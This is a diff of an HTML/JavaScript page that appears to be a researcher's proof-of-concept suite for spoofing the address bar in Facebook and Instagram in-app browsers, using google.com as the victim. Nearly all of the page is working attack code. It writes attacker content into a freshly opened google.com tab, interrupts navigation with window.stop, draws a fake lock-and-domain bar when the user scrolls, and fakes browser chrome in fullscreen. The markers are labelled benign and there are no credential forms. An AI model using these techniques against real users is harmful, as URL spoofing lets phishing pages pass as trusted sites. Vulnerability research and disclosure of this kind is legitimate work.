@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>google.com</title>
+<title>google.commm</title>
 <style>
  :root{--line:#dcdce2;--card:#f4f4f7}
  *{box-sizing:border-box}
@@ -12,19 +12,16 @@
  h1{font-size:17px}h2{font-size:13px;margin:16px 0 4px}
  p{font-size:13px;color:#666}
  code{background:var(--card);padding:1px 5px;border-radius:4px;font-size:12px;word-break:break-all}
- .diag{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;margin:8px 0;font-size:12px}
- button{font-size:14px;padding:11px;margin:4px 0;width:100%;border:1px solid var(--line);border-radius:9px;background:#fff;text-align:left}
- button:active{background:var(--card)}
+ .diag{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;margin:8px 0;font-size:12px;white-space:pre-wrap}
+ button{font-size:14px;padding:12px;margin:4px 0;width:100%;border:1px solid var(--line);border-radius:9px;background:#fff;text-align:left}
+ button:active{background:#e8e8ee}
  input{width:100%;padding:10px;font-size:16px;border:1px solid var(--line);border-radius:9px;margin:5px 0}
- .log{font-size:11px;color:#777;white-space:pre-wrap;margin-top:4px}
  .warn{color:#b23;font-size:11px}
- /* scroll-redress fake bar */
  #fakebar{position:fixed;left:50%;transform:translateX(-50%);min-width:180px;height:40px;padding:0 16px;
    background:#ececef;display:none;align-items:center;justify-content:center;gap:6px;border:1px solid var(--line);
    border-radius:20px;box-shadow:0 1px 6px rgba(0,0,0,.14);z-index:9999;font-size:15px;color:#000}
  #fakebar.top{top:6px}#fakebar.bottom{bottom:8px}
  .spacer{height:150vh}
- /* fullscreen fake chrome */
  #fc{display:none;position:fixed;inset:0;z-index:999999;background:#fff;flex-direction:column}
  #fcbar{height:50px;background:#f2f2f7;border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:center;gap:8px;font-size:16px}
  #fcbody{flex:1;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px}
@@ -35,41 +32,28 @@
 
 <div class="wrap">
  <h1>FB/IG in-app — spoof suite (benign)</h1>
- <p>Authorized research. Neutral markers only (no credential forms). Each technique tries to make the
-    in-app URL bar show a trusted host while THIS attacker content stays. Compare bar vs real origin.
-    The navigation-race class is patched; these are OTHER classes.</p>
- <div class="diag" id="diag"></div>
+ <div class="diag" id="status">loading… (if this stays, JS failed)</div>
  <input id="victim" value="https://www.google.com/">
 
  <h2>1 · 204 / about:blank inheritance</h2>
- <button onclick="t204()">open 204 endpoint &amp; inject benign marker</button>
- <div class="log" id="l1"></div>
-
+ <button data-t="204">open 204 endpoint + inject benign marker</button>
  <h2>2 · hanging-port + window.stop()</h2>
- <button onclick="tStop()">open victim:8443 (hang) + stop + rewrite</button>
- <div class="log" id="l2"></div>
-
- <h2>3 · scroll-collapse UI redress (fake bar)</h2>
- <p>scroll down → fake "🔒 www.google.com" pill appears over the chrome.</p>
- <button onclick="togglePos()">toggle fake bar top/bottom</button>
-
- <h2>4 · iframe URI-scheme (bar confusion)</h2>
- <button onclick="ifr('geo:0,0')">iframe geo:</button>
- <button onclick="ifr('tel:')">iframe tel: <span class="warn">(may prompt — cancel)</span></button>
- <button onclick="ifr('maps://?q=0,0')">iframe maps://</button>
- <div class="log" id="l4"></div>
-
- <h2>5 · slow real resource (optimistic URL)</h2>
- <button onclick="tSlow()">open victim slow/large resource, keep bar</button>
- <div class="log" id="l5"></div>
-
+ <button data-t="stop">open victim:8443 (hang) + stop + rewrite</button>
+ <h2>3 · scroll-collapse fake bar</h2>
+ <p>scroll down → fake "🔒 www.google.com" pill appears.</p>
+ <button data-t="togglepos">toggle fake bar top/bottom</button>
+ <h2>4 · iframe URI-scheme</h2>
+ <button data-t="ifr" data-s="geo:0,0">iframe geo:</button>
+ <button data-t="ifr" data-s="maps://?q=0,0">iframe maps://</button>
+ <button data-t="ifr" data-s="tel:">iframe tel: <span class="warn">(may prompt)</span></button>
+ <h2>5 · slow real resource</h2>
+ <button data-t="slow">open victim resource, keep bar</button>
  <h2>6 · fullscreen fake chrome</h2>
- <button onclick="fsEnter()">enter fullscreen + draw fake bar</button>
- <div class="log" id="l6"></div>
+ <button data-t="fs">enter fullscreen + draw fake bar</button>
 
- <p class="diag"><b>Verdict:</b> SPOOF if the bar shows google.com (or the victim host) while this
-    page's benign content stays visible and the real origin below is not that host.</p>
- <p class="warn">Test on your own device. Long-domain truncation needs hosting at a long subdomain (use brave_longdomain_spoof.html separately).</p>
+ <div class="diag" id="log">log:</div>
+ <p class="diag">real origin = <code id="o"></code></p>
+ <p class="warn">Benign markers only. Long-domain truncation = separate (brave_longdomain_spoof.html).</p>
 </div>
 <div class="spacer"></div>
 
@@ -77,47 +61,40 @@
  <div id="fcbody"><div><h2 style="color:#c00">BENIGN SPOOF TEST</h2><p>Real bar hidden? Fake bar convincing?</p></div></div></div>
 
 <script>
+(function(){
  function g(id){return document.getElementById(id);}
- g('diag').innerHTML='real origin = <code>'+location.origin+'</code><br>UA FB='+/FBAN|FBAV/i.test(navigator.userAgent)+' IG='+/Instagram/i.test(navigator.userAgent);
- function victim(){return (g('victim').value||'https://www.google.com/').trim();}
- function host(){return victim().replace(/^https?:\/\//,'').replace(/\/.*$/,'');}
- function benign(tag){return '<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">'+
-   '<body style="font-family:Arial;text-align:center;padding:30px"><h1 style="color:#c00">BENIGN SPOOF TEST</h1>'+
-   '<p>technique: '+tag+'</p><p>attacker-origin content; bar should NOT say a trusted host.</p>'+
-   '<pre id=o style="font-size:11px;background:#f3f3f3;padding:8px;border-radius:6px;text-align:left"></pre>'+
-   '<scr'+'ipt>document.getElementById("o").textContent="href="+location.href+"\\norigin="+(location.origin||"(opaque)")+"\\ndomain="+document.domain;<\/scr'+'ipt>';}
+ var L=g('log'); function log(m){ L.textContent = m+'\n'+L.textContent; }
+ function victim(){ return (g('victim').value||'https://www.google.com/').trim(); }
+ function host(){ return victim().replace(/^https?:\/\//,'').replace(/\/.*$/,''); }
+ g('o').textContent = location.origin;
 
- function t204(){ var t=window.open('https://www.google.com/csi','_blank'); if(!t){g('l1').textContent='popup blocked';return;}
-   setTimeout(function(){ try{ t.document.open(); t.document.write(benign('204')); t.document.close(); g('l1').textContent='injected — check new tab bar vs origin'; }
-     catch(e){ try{ t.eval('document.write('+JSON.stringify(benign('204'))+');document.close()'); g('l1').textContent='injected via eval'; }catch(e2){ g('l1').textContent='blocked: '+e2.message; }
- } },700); }
+ function benign(tag){
+   var s='<'+'script>document.getElementById("o2").textContent="href="+location.href+" origin="+(location.origin||"opaque")+" domain="+document.domain;</'+'script>';
+   return '<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">'+
+     '<body style="font-family:Arial;text-align:center;padding:30px"><h1 style="color:#c00">BENIGN SPOOF TEST</h1>'+
+     '<p>technique: '+tag+'</p><pre id=o2 style="font-size:11px;background:#f3f3f3;padding:8px;border-radius:6px;text-align:left"></pre>'+s;
+ }
+ function writeTab(t, tag){ try{ t.document.open(); t.document.write(benign(tag)); t.document.close(); return true; }
+   catch(e){ try{ t.eval('document.write('+JSON.stringify(benign(tag))+');document.close()'); return true; }catch(e2){ log('write blocked: '+e2.message); return false; } } }
 
- function tStop(){ var t=window.open('about:blank','_blank'); if(!t){g('l2').textContent='popup blocked';return;}
-   try{t.document.write(benign('stop'));t.document.close();}catch(e){}
-   setTimeout(function(){ try{ t.location.href='https://'+host()+':8443/'; }catch(e){}
-     setTimeout(function(){ try{t.stop&&t.stop();}catch(e){} try{t.document.write(benign('stop-rewrite'));t.document.close();}catch(e){} g('l2').textContent='stopped+rewrote — check bar'; },40); }
-,300); }
+ var H = {
+   '204': function(){ var t=window.open('https://www.google.com/csi','_blank'); if(!t){log('popup blocked');return;} log('opened 204…'); setTimeout(function(){ if(writeTab(t,'204')) log('injected — check new tab bar vs origin'); },700); },
+   'stop': function(){ var t=window.open('about:blank','_blank'); if(!t){log('popup blocked');return;} writeTab(t,'stop'); setTimeout(function(){ try{t.location.href='https://'+host()+':8443/';}catch(e){} setTimeout(function(){ try{t.stop&&t.stop();}catch(e){} writeTab(t,'stop-rewrite'); log('stopped+rewrote — check bar'); },40); },300); },
+   'togglepos': function(){ var fb=g('fakebar'); if(fb.classList.contains('bottom')){fb.classList.remove('bottom');fb.classList.add('top');}else{fb.classList.remove('top');fb.classList.add('bottom');} log('fake bar moved — scroll to reveal'); },
+   'ifr': function(scheme){ var f=document.createElement('iframe'); f.style.cssText='width:1px;height:1px;border:0'; f.src=scheme; document.body.appendChild(f); log('iframe src='+scheme+' — watch bar (origin '+location.origin+')'); },
+   'slow': function(){ var t=window.open('about:blank','_blank'); if(!t){log('popup blocked');return;} writeTab(t,'slow'); setTimeout(function(){ try{t.location.href='https://'+host()+'/csi?'+Date.now();}catch(e){} log('navigated victim resource — bar shows '+host()+'?'); },300); },
+   'fs': function(){ var el=document.documentElement; var rfs=el.requestFullscreen||el.webkitRequestFullscreen; function show(){ g('fc').style.display='flex'; log('fullscreen active='+!!(document.fullscreenElement||document.webkitFullscreenElement)); }
+     if(rfs){ try{ var p=rfs.call(el); if(p&&p.then){p.then(show).catch(function(e){log('fs rejected '+e);show();});} else setTimeout(show,100);}catch(e){log('fs err '+e);show();} } else { log('no fullscreen API'); show(); } }
+ };
 
- function ifr(scheme){ var f=document.createElement('iframe'); f.style.cssText='width:1px;height:1px;border:0';
-   f.srcdoc="<script>setTimeout(function(){try{location.href='"+scheme.replace(/'/g,"\\'")+"'}catch(e){}},300)<\/scr"+"ipt>";
-   document.body.appendChild(f); g('l4').textContent='fired iframe '+scheme+' — watch bar (real origin '+location.origin+')'; }
+ // wire all buttons via addEventListener (robust)
+ var btns=document.querySelectorAll('button[data-t]');
+ for(var i=0;i<btns.length;i++){ (function(b){ b.addEventListener('click', function(){ var t=b.getAttribute('data-t'); log('tap: '+t); try{ if(t==='ifr') H.ifr(b.getAttribute('data-s')); else H[t](); }catch(e){ log('handler err '+e); } }); })(btns[i]); }
 
- function tSlow(){ var t=window.open('about:blank','_blank'); if(!t){g('l5').textContent='popup blocked';return;}
-   try{t.document.write(benign('slow'));t.document.close();}catch(e){}
-   setTimeout(function(){ try{ t.location.href='https://'+host()+'/csi?'+Date.now(); }catch(e){} g('l5').textContent='navigated to victim resource — if bar shows '+host()+' while content stays = s
-poof'; },300); }
+ window.addEventListener('scroll', function(){ g('fakebar').style.display=(window.scrollY>40)?'flex':'none'; }, {passive:true});
 
- // scroll-redress
- var fb=g('fakebar'); window.addEventListener('scroll',function(){ fb.style.display=(window.scrollY>40)?'flex':'none'; },{passive:true});
- function togglePos(){ if(fb.classList.contains('bottom')){fb.classList.remove('bottom');fb.classList.add('top');}else{fb.classList.remove('top');fb.classList.add('bottom');} }
-
- // fullscreen
- function fsEnter(){ var el=document.documentElement; var rfs=el.requestFullscreen||el.webkitRequestFullscreen;
-   if(rfs){ try{ var p=rfs.call(el); if(p&&p.then){p.then(fsShow).catch(function(e){g('l6').textContent='fs rejected: '+e;fsShow();});} else setTimeout(fsShow,100);}catch(e){g('l6').textContent='f
-s err '+e;fsShow();} }
-   else { g('l6').textContent='no fullscreen API'; fsShow(); } }
- function fsShow(){ g('fc').style.display='flex'; g('l6').textContent='fullscreen active='+!!(document.fullscreenElement||document.webkitFullscreenElement)+' — real bar hidden? fake bar convincing
-?'; }
+ g('status').textContent = 'JS loaded ✓  tap a button.  FB='+/FBAN|FBAV/i.test(navigator.userAgent)+' IG='+/Instagram/i.test(navigator.userAgent);
+})();
 </script>
 </body>
 </html>
